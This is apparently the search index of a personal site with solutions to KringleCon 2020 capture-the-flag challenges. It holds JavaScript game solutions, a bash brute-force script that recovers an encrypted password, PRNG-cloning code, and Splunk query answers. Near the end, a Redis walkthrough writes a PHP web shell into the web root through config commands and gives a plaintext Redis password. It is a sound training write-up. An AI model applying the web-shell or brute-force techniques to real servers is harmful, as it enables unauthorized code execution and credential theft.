{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to my Kringle Con 2020 solutions. I have a separate page for every Elf, and every Objective, except for Objective 11b. I never had the time to complete that Objective. My whole family got involved, especially with helping with the elevator. This year was a lot of fun, and I enjoyed the coding based challenges the most. Thanks for a great time!","title":"Home"},{"location":"elves/bonbowford/","text":"Dining Room Ribb Bonbowford - The Elf Code Challenge Hello - my name is Ribb Bonbowford. Nice to meet you! Are you new to programming? It's a handy skill for anyone in cyber security. This challenge centers around JavaScript. Take a look at this intro and see how far it gets you! Ready to move beyond elf commands? Don't be afraid to mix in native JavaScript. Trying to extract only numbers from an array? Have you tried to filter? Maybe you need to enumerate an object's keys and then filter? Getting hung up on number of lines? Maybe try to minify your code. Is there a way to push array items to the beginning of an array? Hmm... Hint There's got to be a way to filter for specific typeof items in an array. Maybe the typeof operator could also be useful? Want to learn a useful language? JavaScript is a great place to start! You can also test out your code using a JavaScript playground . In JavaScript you can enumerate an object's keys using keys, and filter the array using filter. There are lots of ways to make your code shorter , but the number of elf commands is key. var array = [2, 3, 4]; array.push(1) doesn't do QUITE what was intended... Entrance 1 with 2 Elf Statements Short videos (no sound) for each level elf . moveLeft ( 10 ) elf . moveUp ( 11 ) Your browser does not support the video tag. Level 2 - Trigger The Yeeter with 5 Elf Statements elf . moveTo ( lever [ 0 ]) elf . pull_lever ( elf . get_lever ( 0 ) + 2 ) elf . moveLeft ( 4 ) elf . moveUp ( 10 ) Your browser does not support the video tag. Level 3 - Move To Loopiness with 2 Elf Statements [ 0 , 1 , 2 ]. forEach ( element => elf . moveTo ( lollipop [ element ])) elf . moveUp ( 1 ) Your browser does not support the video tag. Level 4 - Up Down Loopiness with 4 Elf Statements for ( i = 0 ; i < 3 ; i ++ ) { elf . moveLeft ( 3 ); elf . moveUp ( 50 ); elf . moveLeft ( 3 ); elf . moveDown ( 50 ) } Your browser does not support the video tag. Level 5 - Move To Madness with 4 Elf Statements elf . moveTo ( lollipop [ 0 ]) elf . tell_munch ( elf . ask_munch ( 0 ). filter ( elem => typeof elem === 'number' )) elf . moveUp ( 5 ) Your browser does not support the video tag. Level 6 - Two Paths, Your Choice with 6 Elf Statements lever_array = elf . get_lever ( 0 ); lever_array . unshift ( \"munchkins rule\" ); [ 0 , 1 , 2 , 3 ]. forEach ( element => elf . moveTo ( lollipop [ element ])); elf . moveTo ( lever [ 0 ]); elf . pull_lever ( lever_array ); elf . moveTo ( munchkin [ 0 ]) elf . moveUp ( 50 ) Your browser does not support the video tag. Level 7 - Yeeter Swirl with 5 Elf Statements function compute_answer ( the_array ) { // some function code will go here console . log ( \"The array is \" + the_array ) var answer = 0 ; for ( i = 0 ; i < the_array . length ; i ++ ) { for ( j = 0 ; j < the_array [ i ]. length ; j ++ ) { if ( isNaN ( the_array [ i ][ j ]) === false ) { answer += the_array [ i ][ j ] } } } return answer } array_elf = [ elf . moveDown , elf . moveLeft , elf . moveUp , elf . moveRight ] for ( index = 0 ; index < 8 ; index ++ ) { array_index = index % 4 ; array_elf [ array_index ]( index + 1 ); elf . pull_lever ( index ); } elf . moveUp ( 2 ) elf . moveLeft ( 4 ) elf . tell_munch ( compute_answer ) elf . moveUp ( 5 ) Your browser does not support the video tag. Level 8 For Loop Finale with 0 Elf Statements It was Level 8 when I realized that the elf statement count was not registering the execution of pointers to functions in arrays. So, 0 Elf Statements was achieved function getKeyByValue ( object , value ) { return Object . keys ( object ). find ( key => object [ key ] === value ); } function compute_answer ( the_array ) { a = \"\" for ( i = 0 ; i < the_array . length ; i ++ ) { b = getKeyByValue ( the_array [ i ], \"lollipop\" ) if ( b !== undefined ){ return b } } } array_elf = [ elf . moveRight , elf . moveLeft ] second_array = [ elf . get_lever , elf . pull_lever , elf . moveUp , elf . tell_munch ] num_lever = 0 ; for ( i = 1 , j = 0 ; j < 6 ; j ++ , i += 2 ) { array_elf [ j % 2 ]( i ); num_lever += second_array [ 0 ]( j ); second_array [ 1 ]( num_lever ); second_array [ 2 ]( 2 ); } second_array [ 3 ]( compute_answer ); array_elf [ 0 ]( 20 ); Your browser does not support the video tag. Success Ribb Bonbowfords's Response Wow - are you a JavaScript developer? Great work! Hey, you know, you might use your JavaScript and HTTP manipulation skills to take a crack at bypassing the Santavator's S4.","title":"Ribb Bonbowford in Dining Room"},{"location":"elves/bonbowford/#dining-room","text":"","title":"Dining Room"},{"location":"elves/bonbowford/#ribb-bonbowford-the-elf-code","text":"Challenge Hello - my name is Ribb Bonbowford. Nice to meet you! Are you new to programming? It's a handy skill for anyone in cyber security. This challenge centers around JavaScript. Take a look at this intro and see how far it gets you! Ready to move beyond elf commands? Don't be afraid to mix in native JavaScript. Trying to extract only numbers from an array? Have you tried to filter? Maybe you need to enumerate an object's keys and then filter? Getting hung up on number of lines? Maybe try to minify your code. Is there a way to push array items to the beginning of an array? Hmm... Hint There's got to be a way to filter for specific typeof items in an array. Maybe the typeof operator could also be useful? Want to learn a useful language? JavaScript is a great place to start! You can also test out your code using a JavaScript playground . In JavaScript you can enumerate an object's keys using keys, and filter the array using filter. There are lots of ways to make your code shorter , but the number of elf commands is key. var array = [2, 3, 4]; array.push(1) doesn't do QUITE what was intended...","title":"Ribb Bonbowford  - The Elf Code"},{"location":"elves/bonbowford/#entrance-1-with-2-elf-statements","text":"Short videos (no sound) for each level elf . moveLeft ( 10 ) elf . moveUp ( 11 ) Your browser does not support the video tag.","title":"Entrance 1 with 2 Elf Statements"},{"location":"elves/bonbowford/#level-2-trigger-the-yeeter-with-5-elf-statements","text":"elf . moveTo ( lever [ 0 ]) elf . pull_lever ( elf . get_lever ( 0 ) + 2 ) elf . moveLeft ( 4 ) elf . moveUp ( 10 ) Your browser does not support the video tag.","title":"Level 2 - Trigger The Yeeter with 5 Elf Statements"},{"location":"elves/bonbowford/#level-3-move-to-loopiness-with-2-elf-statements","text":"[ 0 , 1 , 2 ]. forEach ( element => elf . moveTo ( lollipop [ element ])) elf . moveUp ( 1 ) Your browser does not support the video tag.","title":"Level 3 - Move To Loopiness with 2 Elf Statements"},{"location":"elves/bonbowford/#level-4-up-down-loopiness-with-4-elf-statements","text":"for ( i = 0 ; i < 3 ; i ++ ) { elf . moveLeft ( 3 ); elf . moveUp ( 50 ); elf . moveLeft ( 3 ); elf . moveDown ( 50 ) } Your browser does not support the video tag.","title":"Level 4 - Up Down Loopiness with 4 Elf Statements"},{"location":"elves/bonbowford/#level-5-move-to-madness-with-4-elf-statements","text":"elf . moveTo ( lollipop [ 0 ]) elf . tell_munch ( elf . ask_munch ( 0 ). filter ( elem => typeof elem === 'number' )) elf . moveUp ( 5 ) Your browser does not support the video tag.","title":"Level 5 - Move To Madness with 4 Elf Statements"},{"location":"elves/bonbowford/#level-6-two-paths-your-choice-with-6-elf-statements","text":"lever_array = elf . get_lever ( 0 ); lever_array . unshift ( \"munchkins rule\" ); [ 0 , 1 , 2 , 3 ]. forEach ( element => elf . moveTo ( lollipop [ element ])); elf . moveTo ( lever [ 0 ]); elf . pull_lever ( lever_array ); elf . moveTo ( munchkin [ 0 ]) elf . moveUp ( 50 ) Your browser does not support the video tag.","title":"Level 6 - Two Paths, Your Choice with 6 Elf Statements"},{"location":"elves/bonbowford/#level-7-yeeter-swirl-with-5-elf-statements","text":"function compute_answer ( the_array ) { // some function code will go here console . log ( \"The array is \" + the_array ) var answer = 0 ; for ( i = 0 ; i < the_array . length ; i ++ ) { for ( j = 0 ; j < the_array [ i ]. length ; j ++ ) { if ( isNaN ( the_array [ i ][ j ]) === false ) { answer += the_array [ i ][ j ] } } } return answer } array_elf = [ elf . moveDown , elf . moveLeft , elf . moveUp , elf . moveRight ] for ( index = 0 ; index < 8 ; index ++ ) { array_index = index % 4 ; array_elf [ array_index ]( index + 1 ); elf . pull_lever ( index ); } elf . moveUp ( 2 ) elf . moveLeft ( 4 ) elf . tell_munch ( compute_answer ) elf . moveUp ( 5 ) Your browser does not support the video tag.","title":"Level 7 - Yeeter Swirl with 5 Elf Statements"},{"location":"elves/bonbowford/#level-8-for-loop-finale-with-0-elf-statements","text":"It was Level 8 when I realized that the elf statement count was not registering the execution of pointers to functions in arrays. So, 0 Elf Statements was achieved function getKeyByValue ( object , value ) { return Object . keys ( object ). find ( key => object [ key ] === value ); } function compute_answer ( the_array ) { a = \"\" for ( i = 0 ; i < the_array . length ; i ++ ) { b = getKeyByValue ( the_array [ i ], \"lollipop\" ) if ( b !== undefined ){ return b } } } array_elf = [ elf . moveRight , elf . moveLeft ] second_array = [ elf . get_lever , elf . pull_lever , elf . moveUp , elf . tell_munch ] num_lever = 0 ; for ( i = 1 , j = 0 ; j < 6 ; j ++ , i += 2 ) { array_elf [ j % 2 ]( i ); num_lever += second_array [ 0 ]( j ); second_array [ 1 ]( num_lever ); second_array [ 2 ]( 2 ); } second_array [ 3 ]( compute_answer ); array_elf [ 0 ]( 20 ); Your browser does not support the video tag. Success Ribb Bonbowfords's Response Wow - are you a JavaScript developer? Great work! Hey, you know, you might use your JavaScript and HTTP manipulation skills to take a crack at bypassing the Santavator's S4.","title":"Level 8 For Loop Finale with 0 Elf Statements"},{"location":"elves/bushy/","text":"2 nd Floor Busy Evergreen - Speaker UNPrep There are three separate attacks in this terminal. The Door, Lights and Vending machine. It was a fun one. Door Challenge Door Ohai! Bushy Evergreen, just trying to get this door open. It's running some Rust code written by Alabaster Snowball. I'm pretty sure the password I need for ./door is right in the executable itself. Isn't there a way to view the human-readable strings in a binary file? That's it! What a great password... Running strings and grep for a phrase of passsword will likely reveal it. strings door | grep \"password\" home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There 's gotta be a Be sure to finish the challenge in prod: And don' t forget, the password is \"Op3nTheD00r\" Beep boop invalid password Answer Op3nTheD00r Lights Challenge lights Oh, this might be a good time to mention another lock in the castle. Santa asked me to ask you to evaluate the security of our new HID lock. If ever you find yourself in posession of a Proxmark3, click it in your badge to interact with it. It's a slick device that can read others' badges! Hey, you want to help me figure out the light switch too? Those come in handy sometimes. The password we need is in the lights.conf file, but it seems to be encrypted. There's another instance of the program and configuration in ~/lab/ you can play around with. What if we set the user name to an encrypted value? The lights.conf file in the ./labs directory contains: password: E $ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: elf-technician Based on the hint \"what if we set the username to an encrypted value\", I just copied the encrypted password into the name. Ran the lights , and it exposed the decrypted value of the name, for some reason. Answer The password is Computer-TurnLightsOn Vending Challenge Vending Wow - that worked? I mean, it worked! Hooray for opportunistic decryption, I guess! Oh, did I mention that the Proxmark can simulate badges? Cool, huh? There are lots of references online to help. In fact, there's a talk going on right now! So hey, if you want, there's one more challenge. You see, there's a vending machine in there that the speakers like to use sometimes. Play around with ./vending_machines in the lab folder. You know what might be worth trying? Delete or rename the config file and run it. Then you could set the password yourself to AAAAAAAA or BBBBBBBB. If the encryption is simple code book or rotation ciphers, you'll be able to roll back the original password. The vending-machine.json file looks like: { \"name\" : \"elf-maintenance\" , \"password\" : \"LVEdQPpBwr\" } The hint said to change the password to AAAAA or BBBBBB. It also said to delete or rename the file. By removing the vending-machine.json, it has you create a new file. It asks for a name and password. The encrypted password is always the same number letters as the plaintext. And, the first letter is the same, so no salts. Therefore, it seems that we can use an oracle attack The encrypted password is LVEdQPpBwr Since AAA did not result in XXXX, each letter informs the next. So, we have to figure it out one at a time. The password is 10 letters/numbers long. We will brute force this #!/bin/bash # What has been discovered so far discovered = \"\" # The desired encrypted value encrypted = \"LVEdQPpBwr\" # Total character set to search chars =( a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 ) # Loop through the positions, starting with the first leter to the last letter for i in { 1 ..10 } do # The string in the output json file to search for searching = '\"password\": \"' ${ encrypted : 0 : ${ i }} printf \"\\nRound ${ i } Searching for ${ searching } \\n\" # Brute force every possible letter for letter in \" ${ chars [@] } \" do # remove the file so that when the app runs, it creates its own file rm vending-machines.json # The string we are attempting is a concat of what we know, plus the next leter test_string = ${ discovered }${ letter } printf \"\\n\\nTEST - Discovered = ${ discovered } letter = ${ letter } test_string = ${ test_string } \\n\\n\" #Run the vending-machine program with test input string echo -e \" $test_string \\n $test_string \\n $test_String \\n\" | ./vending-machines #Make a copy so that I can go back latter and troubleshoot cp vending-machines.json vending-machines.out. $test_string .json #If the string is found in the file, then break the loop and append our known good string if grep -Fq \" $searching \" vending-machines.json ; then discovered = ${ test_string } printf \"\\n\\nDISCOVERED= ${ discovered } \\n\\n\" break fi done done printf \"Final Password is $discovered \" Answer CandyCane=1 Busy Evergreen's Your lookup table worked - great job! That's one way to defeat a polyalphabetic cipher! Good luck navigating the rest of the castle. And that Proxmark thing? Some people scan other people's badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers. Do whatever works best for you!","title":"Bushy Evergreen in UNPre"},{"location":"elves/bushy/#2nd-floor","text":"","title":"2nd Floor"},{"location":"elves/bushy/#busy-evergreen-speaker-unprep","text":"There are three separate attacks in this terminal. The Door, Lights and Vending machine. It was a fun one.","title":"Busy Evergreen  - Speaker UNPrep"},{"location":"elves/bushy/#door","text":"Challenge Door Ohai! Bushy Evergreen, just trying to get this door open. It's running some Rust code written by Alabaster Snowball. I'm pretty sure the password I need for ./door is right in the executable itself. Isn't there a way to view the human-readable strings in a binary file? That's it! What a great password... Running strings and grep for a phrase of passsword will likely reveal it. strings door | grep \"password\" home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There 's gotta be a Be sure to finish the challenge in prod: And don' t forget, the password is \"Op3nTheD00r\" Beep boop invalid password Answer Op3nTheD00r","title":"Door"},{"location":"elves/bushy/#lights","text":"Challenge lights Oh, this might be a good time to mention another lock in the castle. Santa asked me to ask you to evaluate the security of our new HID lock. If ever you find yourself in posession of a Proxmark3, click it in your badge to interact with it. It's a slick device that can read others' badges! Hey, you want to help me figure out the light switch too? Those come in handy sometimes. The password we need is in the lights.conf file, but it seems to be encrypted. There's another instance of the program and configuration in ~/lab/ you can play around with. What if we set the user name to an encrypted value? The lights.conf file in the ./labs directory contains: password: E $ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: elf-technician Based on the hint \"what if we set the username to an encrypted value\", I just copied the encrypted password into the name. Ran the lights , and it exposed the decrypted value of the name, for some reason. Answer The password is Computer-TurnLightsOn","title":"Lights"},{"location":"elves/bushy/#vending","text":"Challenge Vending Wow - that worked? I mean, it worked! Hooray for opportunistic decryption, I guess! Oh, did I mention that the Proxmark can simulate badges? Cool, huh? There are lots of references online to help. In fact, there's a talk going on right now! So hey, if you want, there's one more challenge. You see, there's a vending machine in there that the speakers like to use sometimes. Play around with ./vending_machines in the lab folder. You know what might be worth trying? Delete or rename the config file and run it. Then you could set the password yourself to AAAAAAAA or BBBBBBBB. If the encryption is simple code book or rotation ciphers, you'll be able to roll back the original password. The vending-machine.json file looks like: { \"name\" : \"elf-maintenance\" , \"password\" : \"LVEdQPpBwr\" } The hint said to change the password to AAAAA or BBBBBB. It also said to delete or rename the file. By removing the vending-machine.json, it has you create a new file. It asks for a name and password. The encrypted password is always the same number letters as the plaintext. And, the first letter is the same, so no salts. Therefore, it seems that we can use an oracle attack The encrypted password is LVEdQPpBwr Since AAA did not result in XXXX, each letter informs the next. So, we have to figure it out one at a time. The password is 10 letters/numbers long. We will brute force this #!/bin/bash # What has been discovered so far discovered = \"\" # The desired encrypted value encrypted = \"LVEdQPpBwr\" # Total character set to search chars =( a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 ) # Loop through the positions, starting with the first leter to the last letter for i in { 1 ..10 } do # The string in the output json file to search for searching = '\"password\": \"' ${ encrypted : 0 : ${ i }} printf \"\\nRound ${ i } Searching for ${ searching } \\n\" # Brute force every possible letter for letter in \" ${ chars [@] } \" do # remove the file so that when the app runs, it creates its own file rm vending-machines.json # The string we are attempting is a concat of what we know, plus the next leter test_string = ${ discovered }${ letter } printf \"\\n\\nTEST - Discovered = ${ discovered } letter = ${ letter } test_string = ${ test_string } \\n\\n\" #Run the vending-machine program with test input string echo -e \" $test_string \\n $test_string \\n $test_String \\n\" | ./vending-machines #Make a copy so that I can go back latter and troubleshoot cp vending-machines.json vending-machines.out. $test_string .json #If the string is found in the file, then break the loop and append our known good string if grep -Fq \" $searching \" vending-machines.json ; then discovered = ${ test_string } printf \"\\n\\nDISCOVERED= ${ discovered } \\n\\n\" break fi done done printf \"Final Password is $discovered \" Answer CandyCane=1 Busy Evergreen's Your lookup table worked - great job! That's one way to defeat a polyalphabetic cipher! Good luck navigating the rest of the castle. And that Proxmark thing? Some people scan other people's badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers. Do whatever works best for you!","title":"Vending"},{"location":"elves/candysalt/","text":"Great Room Angel Candysalt - Splunk Challenge Challenge Hey Santa, there\u2019s some crazy stuff going on that we can see through our Splunk infrastructure. You better login and see what\u2019s up. There are alot of questions for this one. Rather than detailing how I arrived at each one, I just have a quick answer for each. Q1 How many distinct MITRE ATT&CK techniques did Alice emulate? 13 Q2 What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) t1059.003-main t1059.003-win Q3 One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography Q4 According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) index=attack OSTAP and found the first timecode at 2020-11-30T17:44:15Z Q5 One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? hint - Oh this was a fun one. It takes a bit of pivoting... There is a repo called https://github.com/frgnca/AudioDeviceCmdlets that controls audio capture devices. searching for \"audio\" provided two. T1123 is the attack field. index=\" \" vendor_product=\"Microsoft Sysmon\" EventCode=1 *Audio 3648 Q7 Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? Looking through all the bat files index=\"*\" *.bat* I find one that pointed to the GitHub with mutliple lines \\T1074.001\\src\\Discovery.bat quser Q8 According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? I did not know if I should leave this one in here because it uses the old name for Zeek! In the meantime, I wanted them to look at something like index=* sourcetype=bro* and check out the SSL/TLS certs that are captured in the x509-related sourcetype. This query index=* sourcetype=bro* sourcetype=\"bro:x509:json\" \"certificate.issuer\"=\"CN=win-dc-748.attackrange.local\" finds the seriel of 55FCEEBB21270D9249E86F4B9DC7AA60 BONUS The favorite phrase is \"Stay Frosty\" This last one is encrypted using your favorite phrase! The base64 encoded ciphertext is: 7FXjP1lyfKbyDK/MChyf36h7 It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here! I leave it to the elves to determine which one! The Lollipop Guild Minty's Response Great job! You make this look easy! Hey, have you tried the Splunk challenge? Are you newer to SOC operations? Maybe check out his intro talk from last year. Dave Herrald is doing a great talk on tracking adversary emulation through Splunk! Don't forget about useful tools including Cyber Chef for decoding and decrypting data! It's down in the Great Room, but oh, they probably won't let an attendee operate it.","title":"Angel Candysalt in Great Room"},{"location":"elves/candysalt/#great-room","text":"","title":"Great Room"},{"location":"elves/candysalt/#angel-candysalt-splunk-challenge","text":"Challenge Hey Santa, there\u2019s some crazy stuff going on that we can see through our Splunk infrastructure. You better login and see what\u2019s up. There are alot of questions for this one. Rather than detailing how I arrived at each one, I just have a quick answer for each.","title":"Angel Candysalt  - Splunk Challenge"},{"location":"elves/candysalt/#q1","text":"How many distinct MITRE ATT&CK techniques did Alice emulate? 13","title":"Q1"},{"location":"elves/candysalt/#q2","text":"What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) t1059.003-main t1059.003-win","title":"Q2"},{"location":"elves/candysalt/#q3","text":"One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography","title":"Q3"},{"location":"elves/candysalt/#q4","text":"According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) index=attack OSTAP and found the first timecode at 2020-11-30T17:44:15Z","title":"Q4"},{"location":"elves/candysalt/#q5","text":"One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? hint - Oh this was a fun one. It takes a bit of pivoting... There is a repo called https://github.com/frgnca/AudioDeviceCmdlets that controls audio capture devices. searching for \"audio\" provided two. T1123 is the attack field. index=\" \" vendor_product=\"Microsoft Sysmon\" EventCode=1 *Audio 3648","title":"Q5"},{"location":"elves/candysalt/#q7","text":"Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation? Looking through all the bat files index=\"*\" *.bat* I find one that pointed to the GitHub with mutliple lines \\T1074.001\\src\\Discovery.bat quser","title":"Q7"},{"location":"elves/candysalt/#q8","text":"According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? I did not know if I should leave this one in here because it uses the old name for Zeek! In the meantime, I wanted them to look at something like index=* sourcetype=bro* and check out the SSL/TLS certs that are captured in the x509-related sourcetype. This query index=* sourcetype=bro* sourcetype=\"bro:x509:json\" \"certificate.issuer\"=\"CN=win-dc-748.attackrange.local\" finds the seriel of 55FCEEBB21270D9249E86F4B9DC7AA60","title":"Q8"},{"location":"elves/candysalt/#bonus","text":"The favorite phrase is \"Stay Frosty\" This last one is encrypted using your favorite phrase! The base64 encoded ciphertext is: 7FXjP1lyfKbyDK/MChyf36h7 It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here! I leave it to the elves to determine which one! The Lollipop Guild Minty's Response Great job! You make this look easy! Hey, have you tried the Splunk challenge? Are you newer to SOC operations? Maybe check out his intro talk from last year. Dave Herrald is doing a great talk on tracking adversary emulation through Splunk! Don't forget about useful tools including Cyber Chef for decoding and decrypting data! It's down in the Great Room, but oh, they probably won't let an attendee operate it.","title":"BONUS"},{"location":"elves/coalbox/","text":"Speaker Room Tangle Coalbox - Snowball Fight Challenge Howdy gumshoe. I'm Tangle Coalbox, resident sleuth in the North Pole. If you're up for a challenge, I'd ask you to look at this here Snowball Game. We tested an earlier version this summer, but that one had web socket vulnerabilities. This version seems simple enough on the Easy level, but the Impossible level is, well... I'd call it impossible, but I just saw someone beat it! I'm sure something's off here. Could it be that the name a player provides has some connection to how the forts are laid out? Knowing that, I can see how an elf might feed their Hard name into an Easy game to cheat a bit. But on Impossible, the best you get are rejected player names in the page comments. Can you use those somehow? Check out Tom Liston's talk for more info, if you need it. Hint Tom Liston's talk on mersenne twisters Tom has code to help with cloning at Github On Easy I just started randomly hitting the board until I won. Impossible I started the game and took a look in the comments. there were a list of random numbers to seed the code. I copied them to a seeds.txt file. This file had a list of random numbers that were discarded, the next one would be the one in use to generate the board. Therefore, we had to figure out what the next random number would be. Taking Tom's code and reworking the main(), I was able to detect the next random code, which is what was used to generate the game board. if __name__ == \"__main__\" : myprng = mt19937 ( 0 ) seed_array = [] with open ( 'seeds.txt' ) as my_file : for seed in my_file : seed_array . append ( int ( seed . strip ())) for i in range ( mt19937 . n ): myprng . MT [ i ] = untemper ( seed_array [ i ]) print ( \"The next numbers is %d \" % myprng . extract_number ()) I opened another version of the game, on easy and using the predicted next key, tested every square until I knew what the board was. I then went back to the original Impossible game and finished it. Tangle Coalbox Crikey - that's it! You've done the Impossible! You've impressed this old elf today. Great work identifying and abusing the pseudo-random sequence. Now, the REAL question is, how else can this be abused? Do you think someone could try and cheat the Naughty/Nice Blockchain with this? If you have control over to bytes in a file, it's easy to create MD5 hash collisions. Problem is: there's that nonce that he would have to know ahead of time. A blockchain works by \"chaining\" blocks together - so there's no way that Jack could change it without it messing up the chain... Maybe if you look at the block that seems like it got changed, it might help. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision. Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. That's about all the help I can give you, kid, but Prof. Petabyte may have more.","title":"Tangle Coalbox in Speaker Room"},{"location":"elves/coalbox/#speaker-room","text":"","title":"Speaker Room"},{"location":"elves/coalbox/#tangle-coalbox-snowball-fight","text":"Challenge Howdy gumshoe. I'm Tangle Coalbox, resident sleuth in the North Pole. If you're up for a challenge, I'd ask you to look at this here Snowball Game. We tested an earlier version this summer, but that one had web socket vulnerabilities. This version seems simple enough on the Easy level, but the Impossible level is, well... I'd call it impossible, but I just saw someone beat it! I'm sure something's off here. Could it be that the name a player provides has some connection to how the forts are laid out? Knowing that, I can see how an elf might feed their Hard name into an Easy game to cheat a bit. But on Impossible, the best you get are rejected player names in the page comments. Can you use those somehow? Check out Tom Liston's talk for more info, if you need it. Hint Tom Liston's talk on mersenne twisters Tom has code to help with cloning at Github","title":"Tangle Coalbox  - Snowball Fight"},{"location":"elves/coalbox/#on-easy","text":"I just started randomly hitting the board until I won.","title":"On Easy"},{"location":"elves/coalbox/#impossible","text":"I started the game and took a look in the comments. there were a list of random numbers to seed the code. I copied them to a seeds.txt file. This file had a list of random numbers that were discarded, the next one would be the one in use to generate the board. Therefore, we had to figure out what the next random number would be. Taking Tom's code and reworking the main(), I was able to detect the next random code, which is what was used to generate the game board. if __name__ == \"__main__\" : myprng = mt19937 ( 0 ) seed_array = [] with open ( 'seeds.txt' ) as my_file : for seed in my_file : seed_array . append ( int ( seed . strip ())) for i in range ( mt19937 . n ): myprng . MT [ i ] = untemper ( seed_array [ i ]) print ( \"The next numbers is %d \" % myprng . extract_number ()) I opened another version of the game, on easy and using the predicted next key, tested every square until I knew what the board was. I then went back to the original Impossible game and finished it. Tangle Coalbox Crikey - that's it! You've done the Impossible! You've impressed this old elf today. Great work identifying and abusing the pseudo-random sequence. Now, the REAL question is, how else can this be abused? Do you think someone could try and cheat the Naughty/Nice Blockchain with this? If you have control over to bytes in a file, it's easy to create MD5 hash collisions. Problem is: there's that nonce that he would have to know ahead of time. A blockchain works by \"chaining\" blocks together - so there's no way that Jack could change it without it messing up the chain... Maybe if you look at the block that seems like it got changed, it might help. If Jack was able to change the block AND the document without changing the hash... that would require a very UNIque hash COLLision. Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. That's about all the help I can give you, kid, but Prof. Petabyte may have more.","title":"Impossible"},{"location":"elves/evergreen/","text":"Kitchen Holly Evergreen - Redis Terminal Challenge Hi, so glad to see you! I'm Holly Evergreen. I've been working with this Redis-based terminal here. We're quite sure there's a bug in it, but we haven't caught it yet. The maintenance port is available for curling, if you'd like to investigate. Can you check the source of the index.php page and look for the bug? I read something online recently about remote code execution on Redis. That might help! I think I got close to RCE, but I get mixed up between commas and plusses. You'll figure it out, I'm sure! The \"Terminal\" for this elf challenge is a phone, and the right sequence of numbers and modem sounds must be hit. The challenge had a hint that links to the proper startup sound. Terminal Message We need your help!! The server stopped working, all that 's left is the maintenance port. To access it, run: curl http://localhost/maintenance.php We' re pretty sure the bug is in the index page. Can you somehow use the maintenance page to view the source code for the index page? Hint The hint on page on the Pentesting Redis Page demonstrated a technique for gaining RCE on a REDIS server. This YouTube video also helped. https://www.youtube.com/watch?v=LVlQmRM6DZ0 Playing with the commands, such as curling the maintenance page, I found this player@19977e41d642:~$ curl http://localhost/maintenance.php ERROR: 'cmd' argument required ( use commas to separate commands ) ; eg: curl http://localhost/maintenance.php?cmd = help curl http://localhost/maintenance.php?cmd = mget,example1 player@19977e41d642:~$ curl http://localhost/maintenance.php?cmd = help test Running: redis-cli --raw -a '<password censored>' 'help' redis-cli 5 .0.3 To get help about Redis commands type: \"help @<group>\" to get a list of commands in <group> \"help <command>\" for help on <command> \"help <tab>\" to get a list of possible help topics \"quit\" to exit To set redis-cli preferences: \":set hints\" enable online hints \":set nohints\" disable online hints Set your preferences in ~/.redisclirc curl: ( 6 ) Could not resolve host: test Leveraging the hints, here are the commands that would extract the contents of the index.php file. We are going to stuff a file_get_contents command inside a webshell.php and have that served by the Redis. Since we are submitting the command through URL parameters, we must encode the parameters. \"<?php echo file_get_contents('index.php'); ?>\" encodes to %22%3C%3Fphp%20echo%20file_get_contents%28%27index.php%27%29%3B%20%3F%3E%22 The commands are: curl http://localhost/maintenance.php?cmd = config,set,dir,/var/www/html curl http://localhost/maintenance.php?cmd = config,set,dbfilename,webshell.php curl http://localhost/maintenance.php?cmd = set,test,%22%3C%3Fphp%20echo%20file_get_contents%28%27index.php%27%29%3B%20%3F%3E%22 curl http://localhost/maintenance.php?cmd = save curl -o - http://localhost/webshell.php ALTERNATIVE APPROACH The password to authenticate with redis is in plaintext in /etc/redis/redis.conf. requirepass \"R3disp@ss\" . I used a similar set of commands to perform the attack. redis-cli -a R3disp@ss config set dir /var/www/html redis-cli -a R3disp@ss config set dbfilename webshell.php redis-cli -a R3disp@ss set test \"<?php echo file_get_contents('index.php');?>\" redis-cli -a R3disp@ss save curl -o - http://localhost/webshell.php Success # We found the bug!! # # \\ / # .\\-/. # /\\ () () # \\/~---~\\.-~^-. # .-~^-./ | \\---. # { | } \\ # .-~\\ | /~-. # / \\ A / \\ # \\/ \\/ # Evergreen's Response See? I knew you 